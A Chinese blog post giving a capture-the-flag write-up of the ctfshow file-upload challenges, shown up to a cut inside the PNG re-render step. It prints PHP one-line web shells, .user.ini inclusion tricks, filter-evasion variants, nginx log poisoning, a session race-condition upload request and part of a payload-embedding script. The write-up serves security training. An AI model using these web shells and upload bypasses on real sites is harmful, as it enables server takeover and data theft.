<!DOCTYPE html>

<html lang="zh-CN">
    <head>
    <meta charset="utf-8">
    <!--
        hexo-theme-suka © SukkaW
        GitHub: https://github.com/SukkaW/hexo-theme-suka
    -->

    <!-- ### Resource Hint ### -->

    <!-- ## DNS Prefetch ## -->
    <meta http-equiv="x-dns-prefetch-control" content="on">

<!-- busuanzi -->


<!-- comment -->







<!-- analytics -->







    <!-- ## Preload ## -->
    




    <!-- ### Meta & Title & Info ### -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, minimum-scale=1, initial-scale=1, maximum-scale=5, viewport-fit=cover">
    <meta name="renderer" content="webkit">

    <!-- Title -->
    <title>ctfshow-文件上传 | Z1d10tのBlog</title>

    <!-- Favicons -->
    <link rel="icon" type="image&#x2F;ico" href="/img/suka-favicon.ico">

    <!-- ### Import File ### -->
    <link rel="stylesheet" href="/lib/spectre/spectre.min.css"><style>
    body {
        background-color: #f8f9fa;
    }

    a, a:visited {
        color: #0070ff;
    }

    a:active, a:focus, a:hover {
        color: #0070ff;
        opacity: .75;
    }

    #post-content a,
    #post-content a:hover,
    #post-content a:focus,
    #post-content a:visited {
        color: #005eb9;
        opacity: 1;
    }

    

    .post-entry .card-body a {
        color: #0070ff;
    }

    .avatar {
        background: #444;
    }

    .navbar-link,
    .navbar-link:visited,
    .timeline .timeline-item .timeline-icon.icon-lg {
        color: #0070ff;
    }

    .navbar-link:hover {
        color: #0070ff;
        opacity: .8;
    }

    #search-input .btn,
    #disqus_click_btn,
    #disqus-switch-to-direct,
    #disqus-loadmore-button {
        background: #727e96;
        border-color: #727e96;
        color: #fff;
    }

    #post-toc a.post-toc-link,
    #post-toc a.post-toc-link:visited,
    .share-menu.menu .menu-item>a {
        color: #727e96;
    }

    .share-menu.menu .menu-item>a:hover,
    .share-menu.menu .menu-item>a:focus,
    .share-menu.menu .menu-item>a:visited {
        color: #50596c;
        background: #f8f9fa;
        opacity: .85;
    }
</style><link rel="stylesheet" href="/css/style.min.css">








    <!-- Prettify Theme -->
    
    <link rel="preload" href="/css/highlight/github.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="/css/highlight/github.min.css"></noscript>





<script>
/*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
!function(t){"use strict";t.loadCSS||(t.loadCSS=function(){});var e=loadCSS.relpreload={};if(e.support=function(){var e;try{e=t.document.createElement("link").relList.supports("preload")}catch(t){e=!1}return function(){return e}}(),e.bindMediaToggle=function(t){var e=t.media||"all";function a(){t.addEventListener?t.removeEventListener("load",a):t.attachEvent&&t.detachEvent("onload",a),t.setAttribute("onload",null),t.media=e}t.addEventListener?t.addEventListener("load",a):t.attachEvent&&t.attachEvent("onload",a),setTimeout(function(){t.rel="stylesheet",t.media="only x"}),setTimeout(a,3e3)},e.poly=function(){if(!e.support())for(var a=t.document.getElementsByTagName("link"),n=0;n<a.length;n++){var o=a[n];"preload"!==o.rel||"style"!==o.getAttribute("as")||o.getAttribute("data-loadcss")||(o.setAttribute("data-loadcss",!0),e.bindMediaToggle(o))}},!e.support()){e.poly();var a=t.setInterval(e.poly,500);t.addEventListener?t.addEventListener("load",function(){e.poly(),t.clearInterval(a)}):t.attachEvent&&t.attachEvent("onload",function(){e.poly(),t.clearInterval(a)})}"undefined"!=typeof exports?exports.loadCSS=loadCSS:t.loadCSS=loadCSS}("undefined"!=typeof global?global:this);
</script>

    <!-- ### Site Verification ### -->
    


    <meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Z1d10tのBlog"><meta name="msapplication-starturl" content="https://z1d10t.fun"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Z1d10tのBlog"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">

    <!-- ### The Open Graph & Twitter Card Protocol ### -->
    <meta property="og:title" content="ctfshow-文件上传 | Z1d10tのBlog"><meta property="og:site_name" content="Z1d10tのBlog"><meta property="og:type" content="article"><meta property="og:url" content="https://z1d10t.fun/post/c5a854c1.html"><meta property="og:locale" content="zh-CN"><meta name="description" content="ctfshow-文件上传 - Z1d10t - Z1d10tのBlog"><meta name="keywords" content="文件上传"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688359146297-fb9749ff-2ad8-4a8d-b933-10f21f0d0931.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688365737442-53a194dd-aeea-4986-ba00-86ec08a101d4.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688444635540-b95e7f67-b6d6-4d61-9ecd-040a9d0124a4.png"><meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688451112419-1980ecb8-25aa-44d8-b6fe-14b539de29fc.png"><meta property="article:published_time" content="2023-07-04T08:32:29.000Z"><meta property="article:modified_time" content="2023-07-25T11:50:17.839Z"><meta property="og:updated_time" content="2023-07-25T11:50:17.839Z"><meta property="article:author" content="Z1d10t"><meta property="article:tag" content="文件上传"><meta name="twitter:card" content="summary">

    

    <!-- ### Canonical link ### -->
    <link rel="canonical" href="https://z1d10t.fun/post/c5a854c1.html">

    <meta name="generator" content="Hexo 6.3.0">

    <!-- ### Analytics ### -->
    







    <!-- ### Structured Data ### -->
    



<script type="application/ld+json">
{
    "@context": "http://schema.org",
    "url": "https://z1d10t.fun/post/c5a854c1.html",
    "@type": "BlogPosting",
    "logo": "https://z1d10t.fun/img/suka-favicon.ico",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "https://z1d10t.fun/post/c5a854c1.html"
    },
    "headline": "ctfshow-文件上传 | Z1d10tのBlog",
    
    "image": {
        "@type": "ImageObject",
        "url": "https://z1d10t.fun/img/suka-favicon.ico"
    },
    
    "datePublished": "2023-07-04T08:32:29.000Z",
    "dateModified": "2023-07-25T11:50:17.839Z",
    "author": {
        "@type": "Person",
        "name": "Z1d10t",
        "image": {
            "@type": "ImageObject",
            "url": "https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar.png"
        },
        "description": "“分享欲正在消逝”"
    },
    "publisher": {
        "@type": "Organization",
        "name": "Z1d10tのBlog",
        "logo": {
            "@type": "ImageObject",
            "url": "https://z1d10t.fun/img/suka-favicon.ico"
        }
    },
    
    "potentialAction": {
        "@type": "SearchAction",
        "target": "https://z1d10t.fun/search/?s={search_term_string}",
        "query-input": "required name=search_term_string"
    },
    
    "keywords": "文件上传",
    "description": "ctfshow-文件上传 - Z1d10t - Z1d10tのBlog"
}
</script>



    <!-- ### Custom Head ### -->
    
</head>

    <body>
            

            <!-- ### Main content ### -->
            <!-- ## Header ##-->
<header>
    <h1 class="header-title text-center"><a href="/">Z1d10tのBlog</a></h1>

    <p class="text-center header-slogan">
        
            
                “分享欲正在消逝”
            
        
    </p>

    <nav class="navbar-section text-center">
    
        <a href="/" class="navbar-link">Home</a>
    
    
        <a href="/archives/" class="navbar-link">Archives</a>
    
    
        <a href="/search/" class="navbar-link">Search</a>
    
    
        <a href="/about/" class="navbar-link">About</a>
    
        <a href="/links/" class="navbar-link">Friends</a>
    
    
    
</nav>
</header>

            
    <!-- ## Post ## -->
    <div class="post-container">
    <div id="post-card" class="card">
        
        <div class="card-item-container">
            <div class="card-inner-cell">
                <!-- # Post Header Info # -->
                <div class="card-header">
                    
    <h1 class="card-title h3 mb-2">ctfshow-文件上传</h1>




<div class="post-header-info">
    <p class="post-header-info-left text-gray">
        <img class="author-thumb lazyload" data-src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar.png" src="/img/suka-lazyload.gif" alt="Z1d10t's Avatar">
        <span>2023-07-04</span>
        
            <span class="suka-devide-dot"></span>
            <a class="category-link" href="/categories/ctfshow/">ctfshow</a>
        
        
        
    </p>
    <div class="post-header-info-right">
        
            <div class="dropdown dropdown-right">
<a class="dropdown-toggle" tabindex="0">分享本文</a>
<ul class="menu share-menu">
    <!-- Share Weibo -->
    
    <li class="menu-item">
        <a href="http://service.weibo.com/share/share.php?appkey=&title=ctfshow-文件上传&url=https://z1d10t.fun/post/c5a854c1.html&pic=https://z1d10t.fun/img/suka-favicon.ico&searchPic=false&style=simple" target="_blank" rel="external noopener noreferrer nofollow">分享到微博</a>
    </li>
    

    <!-- Share Twitter -->
    
    <li class="menu-item">
        <a href="https://twitter.com/intent/tweet?text=ctfshow-文件上传&url=https://z1d10t.fun/post/c5a854c1.html&via=Z1d10t" target="_blank" rel="external noopener noreferrer nofollow">分享到 Twitter</a>
    </li>
    

    <!-- Share Facebook -->
    
    <li class="menu-item">
        <a href="https://www.facebook.com/sharer/sharer.php?u=https://z1d10t.fun/post/c5a854c1.html" target="_blank" rel="external noopener noreferrer nofollow">分享到 Facebook</a>
    </li>
    

    <!-- Share Google+ -->
    
    <li class="menu-item">
        <a href="https://plus.google.com/share?url=https://z1d10t.fun/post/c5a854c1.html" target="_blank" rel="external noopener noreferrer nofollow">分享到 Google+</a>
    </li>
    

    <!-- Share LinkedIn -->
    
    <li class="menu-item">
        <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://z1d10t.fun/post/c5a854c1.html&title=Z1d10tのBlog" target="_blank" rel="external noopener noreferrer nofollow">分享到 LinkedIn</a>
    </li>
    

    <!-- Share QQ -->
    
    <li class="menu-item">
        <a href="http://connect.qq.com/widget/shareqq/index.html?site=Z1d10tのBlog&title=Z1d10tのBlog&summary=邪王真眼是最强的！&pics=https://z1d10t.fun/img/suka-favicon.ico&url=https://z1d10t.fun/post/c5a854c1.html" target="_blank" rel="external noopener noreferrer nofollow"> 分享到 QQ</a>
    </li>
    

    <!-- Share Telegram -->
    
    <li class="menu-item">
        <a href="https://t.me/share/url?url=https://z1d10t.fun/post/c5a854c1.html&text=Z1d10tのBlog" target="_blank" rel="external noopener noreferrer nofollow">分享到 Telegram</a>
    </li>
    

    <!-- QRCode -->
    
    <li class="menu-item">
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIQAAACECAAAAAB0L9x7AAABhUlEQVR42u3ay67CMAyE4b7/S8MWVfXMpJTWFn83SBwI38InviTbq8GzgQABYgRiE4/6zOff9p+L1wXRFnEYNLv3Fezoe8m6IHoj9ou6xapATNcFMRtR/VCFAfEfCBWARwkKxHxElWiqJFUu/IssCuJ2hCpIv3m9rNoGcSvCNq1FwlIb1+VdOYhbESqQHM5tWm49EL0RSWJyDXDSPNksCqIVovpyCkgKIhuYIB5HKEDS9Nhitgh0EHMQKw2t+yE7XAHREqGGICrw1KZ2KoGBaINQG5UqaNVgVQ1U5H8HiFYI1wSrgicJ8jiBgWiHSIZoboDqDnZB9Ea4DSgpatwFjjKoQYxApMNx29gkBTKI1oi0kVEb0MoGB2IGIt1kkkO8pDgG0RNx9iDOFTjRhVIQLRHpReHVJjlqnkG0RaTD9uQSoBqUgZiFSC70qKGrO/g/1RCDaItwlwGTg96osgIxCpE2yMnABMQMhDt0T5KZO4gBMQeRNLLJ0HQZB6Il4skHBAgQrRFv2fjZWQTFO0oAAAAASUVORK5CYII=" alt="QRCode">
    </li>
    

</ul>
</div>
        
    </div>
</div>
                </div>
                <div class="card-body">
                    
                        
                        
                            <div id="post-toc"><ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEB-151-%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81"><span class="post-toc-number">1.</span> <span class="post-toc-text">WEB-151(前端验证)</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEB-152-%E5%90%8E%E7%AB%AFContent-Type%E6%A0%A1%E9%AA%8C"><span class="post-toc-number">2.</span> <span class="post-toc-text">WEB-152(后端Content-Type校验)</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEB-153%EF%BC%88-user-ini%EF%BC%89"><span class="post-toc-number">3.</span> <span class="post-toc-text">WEB-153（.user.ini）</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEB-154-155%EF%BC%88-user-ini-%E7%9F%AD%E6%A0%87%E7%AD%BE%EF%BC%89"><span class="post-toc-number">4.</span> <span class="post-toc-text">WEB-154~155（.user.ini+短标签）</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEB-156-%E7%BB%95%E8%BF%87"><span class="post-toc-number">5.</span> <span class="post-toc-text">WEB-156([]绕过)</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEB-157-159-%E7%BB%95%E8%BF%87"><span class="post-toc-number">6.</span> <span class="post-toc-text">WEB-157~159({} ; ()绕过)</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEB-160-%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB-%E7%BB%95log"><span class="post-toc-number">7.</span> <span class="post-toc-text">WEB-160(日志包含 绕log)</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEB-161-%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87"><span class="post-toc-number">8.</span> <span class="post-toc-text">WEB-161(文件头检测绕过)</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEB-162-163-session-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="post-toc-number">9.</span> <span class="post-toc-text">WEB-162~163(session 条件竞争)</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEB-164%EF%BC%88PNG-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%EF%BC%89"><span class="post-toc-number">10.</span> <span class="post-toc-text">WEB-164（PNG 二次渲染）</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEB-165-jpg%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="post-toc-number">11.</span> <span class="post-toc-text">WEB-165(jpg二次渲染)</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEB-166-zip"><span class="post-toc-number">12.</span> <span class="post-toc-text">WEB-166(zip)</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEB-167-htaccess"><span class="post-toc-number">13.</span> <span class="post-toc-text">WEB-167(.htaccess)</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEB-168-%E5%85%8D%E6%9D%80"><span class="post-toc-number">14.</span> <span class="post-toc-text">WEB-168(免杀)</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEB-169-WEB-170-%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="post-toc-number">15.</span> <span class="post-toc-text">WEB-169~WEB-170(日志包含)</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E7%BB%93%E5%B0%BE%EF%BC%9A"><span class="post-toc-number">16.</span> <span class="post-toc-text">结尾：</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-number">17.</span> <span class="post-toc-text"></span></a></li></ol></div>
                        
                    
                    <article id="post-content">
                        <p>ctfshow-文件上传</p>
<span id="more"></span>

<h1 id="WEB-151-前端验证"><a href="#WEB-151-前端验证" class="headerlink" title="WEB-151(前端验证)"></a>WEB-151(前端验证)</h1><p>上传png后缀的 然后抓包改回php即可</p>
<h1 id="WEB-152-后端Content-Type校验"><a href="#WEB-152-后端Content-Type校验" class="headerlink" title="WEB-152(后端Content-Type校验)"></a>WEB-152(后端Content-Type校验)</h1><p> Content-Type是返回消息中非常重要的内容，表示后面的文档属于什么MIME类型。  </p>
<p>所以跟151做法一样 先上传png然后bp改后缀即可</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types</a></p>
<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000013056786">https://segmentfault.com/a/1190000013056786</a></p>
<h1 id="WEB-153（-user-ini）"><a href="#WEB-153（-user-ini）" class="headerlink" title="WEB-153（.user.ini）"></a>WEB-153（.user.ini）</h1><p>前两种通过修改后缀这里不能用了</p>
<p>访问&#x2F;upload 发现有内容nothing here 然后可以猜到这里有&#x2F;uplaod&#x2F;index.php </p>
<p>那么目标就很明确了 我们上传的路径下有一个现成的php文件 理所当然想到通过上传.user.ini来做这道题</p>
<p>但是.htaccess只是适用于apache，如果变成niginx或者iis则不会被解析  	</p>
<p>通过报错我们可以看到题目环境中间件是nginx 但是这也不影响我们用.user.ini</p>
<p>因为只要用了fastcgi我们就可以用.user.ini</p>
<p>FastCGI常用于将Web服务器（如Nginx、Apache）与应用程序（如PHP、Python、Ruby）进行集成，以提供动态内容的生成和处理能力。它是一种高性能、灵活和可扩展的Web应用程序交互协议。  </p>
<p>.user.ini:</p>
<p>.user.ini也是php的一种配置文件，众所周知php.ini是php的配置文件，它可以做到显示报错，导入扩展，文件解析，web站点路径等等设置。但是如果想要把某个文件里面的配置与全局的php.ini不同，则可以在php文件中加上ini_set()来配置特定的配置变量。</p>
<p>而.user.ini和.htaccess一样是对当前目录的所以php文件的配置设置，即写了.user.ini和它同目录的文件会优先使用.user.ini中设置的配置属性。</p>
<p>偷的<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sijidou/p/13121301.html">https://www.cnblogs.com/sijidou/p/13121301.html</a></p>
<p>简单理解就是php的配置文件它可以设置一些配置 比如怎么去解析我们上传的文件一类的</p>
<p>内容:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//.user.ini</span></span><br><span class="line"></span><br><span class="line">auto_prepend_file=top.html</span><br><span class="line">auto_append_file=down.html</span><br></pre></td></tr></table></figure>

<p>怎么理解？</p>
<p>就是把我们指定的文件包含进宿主php文件中 利用其实本质就是用require()去包含我们的恶意文件并且即使后缀不是php文件也可被当作php文件来解析</p>
<p>这里require()完全就是include()函数一样</p>
<p>一个是宿主php文件头部去包含 一个是尾部两者皆可</p>
<p>先将.user.ini增加后缀png然后抓包去除 在上传我们指定的恶意文件</p>
<p>这时我们前面已经说的很清楚了 直接访问&#x2F;upload&#x2F;index.php 这样我们的木马就被包含在这个index.php文件中了而不是直接去访问我们的木马文件</p>
<p>可以看到 已经包含在头部了</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688359146297-fb9749ff-2ad8-4a8d-b933-10f21f0d0931.png" alt="img"></p>
<h1 id="WEB-154-155（-user-ini-短标签）"><a href="#WEB-154-155（-user-ini-短标签）" class="headerlink" title="WEB-154~155（.user.ini+短标签）"></a>WEB-154~155（.user.ini+短标签）</h1><p>waf了文件内容php字样</p>
<p>用短标签bypass即可 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="WEB-156-绕过"><a href="#WEB-156-绕过" class="headerlink" title="WEB-156([]绕过)"></a>WEB-156([]绕过)</h1><p>在154~155基础上过滤了<code>[]</code>用<code>&#123;&#125;</code>bypass</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=@eval($_POST&#123;x&#125;);?&gt;</span><br></pre></td></tr></table></figure>

<h1 id="WEB-157-159-绕过"><a href="#WEB-157-159-绕过" class="headerlink" title="WEB-157~159({} ; ()绕过)"></a>WEB-157~159({} ; ()绕过)</h1><p>在前面基础上过滤了{}和分号 那我们不写一句话了 直接命令执行读flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`tac ./../f*`;?&gt;` 或者`&lt;?=system(&#x27;tac ../f*&#x27;)?&gt;</span><br></pre></td></tr></table></figure>

<p>159不行 过滤了括号只能用第一种 </p>
<h1 id="WEB-160-日志包含-绕log"><a href="#WEB-160-日志包含-绕log" class="headerlink" title="WEB-160(日志包含 绕log)"></a>WEB-160(日志包含 绕log)</h1><p><code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code>log用拼接绕过</p>
<p>然后文件头User-Agent包含一句话木马即可</p>
<h1 id="WEB-161-文件头检测绕过"><a href="#WEB-161-文件头检测绕过" class="headerlink" title="WEB-161(文件头检测绕过)"></a>WEB-161(文件头检测绕过)</h1><p>在160基础上增加了检测文件头的函数 增加图片头GIF89a绕过即可</p>
<p>getimagesize(): 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688365737442-53a194dd-aeea-4986-ba00-86ec08a101d4.png" alt="img"></p>
<p>其实GIF89a就是我们一般见到的gif动图的文件头</p>
<p>通过010对一个gif图分析就能看到文件头</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688444635540-b95e7f67-b6d6-4d61-9ecd-040a9d0124a4.png" alt="img"></p>
<h1 id="WEB-162-163-session-条件竞争"><a href="#WEB-162-163-session-条件竞争" class="headerlink" title="WEB-162~163(session 条件竞争)"></a>WEB-162~163(session 条件竞争)</h1><p>之前别的模块做过类似的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;http://953ea87b-dff4-45be-adac-15a38b1fd7e3.challenge.ctf.show/&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="string">&quot;123&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>上传一个文件改数据包：</p>
<p>加上木马和<code>Cookie:PHPSESSID=ban</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">953</span>ea87b-dff4-<span class="number">45</span>be-adac-<span class="number">15</span>a38b1fd7e3.challenge.ctf.show</span><br><span class="line">Content-Length: <span class="number">352</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: <span class="literal">null</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybDQ9C8w3UWP0rUGY</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Cookie:PHPSESSID=ban</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundarybDQ9C8w3UWP0rUGY</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?php system(&#x27;cat ../f*&#x27;);?&gt;</span></span><br><span class="line"><span class="comment">------WebKitFormBoundarybDQ9C8w3UWP0rUGY</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.png&quot;</span></span><br><span class="line"><span class="comment">Content-Type: image/png</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">GIF89a</span></span><br><span class="line"><span class="comment">&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundarybDQ9C8w3UWP0rUGY--</span></span><br></pre></td></tr></table></figure>

<p>然后再将.user.ini改为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=/tmp/sess_ban</span><br></pre></td></tr></table></figure>

<p>然后两个条件竞争一直发包即可</p>
<h1 id="WEB-164（PNG-二次渲染）"><a href="#WEB-164（PNG-二次渲染）" class="headerlink" title="WEB-164（PNG 二次渲染）"></a>WEB-164（PNG 二次渲染）</h1><p>随便上传一个图片 然后我们可以访问<code>http://6a0dd0db-7621-467f-8c76-dd8bd63732b6.challenge.ctf.show/download.php?image=32d3ca5e23f4ccf1e4c8660c40e75f33.png</code> 可以看到是通过文件包含形式</p>
<p>二次渲染就是我们夹杂在图像里的木马上传后会被删掉 我们需要下载下来找到它不删除的地方把我们的木马加进去然后利用文件包含执行我们的木马</p>
<p>因为我的php是8.2.0的版本 修改ini文件 <code>extension=gd</code>把前面的<code>;</code>去掉</p>
<p>然后才能用这个脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">            <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">            <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">            <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">            <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">            <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">            <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">            <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span 